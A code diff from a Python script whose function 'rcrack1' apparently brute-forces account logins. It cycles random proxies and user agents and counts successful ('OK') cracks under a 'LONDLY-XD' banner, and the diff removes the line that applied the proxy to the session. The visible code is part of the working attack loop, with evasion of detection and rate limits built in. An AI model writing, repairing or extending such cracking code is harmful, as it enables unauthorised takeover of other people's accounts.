@@ -234,7 +234,6 @@ def rcrack1(uid,pwx,tl):
             pro = random.choice(ugen)
             proxy_u = random.choice(saved_proxies).strip()
             proxies = {'http':f'{proxy_u}'}
-            session.proxies.update(proxies)
             session = requests.Session()
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sLONDLY-XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
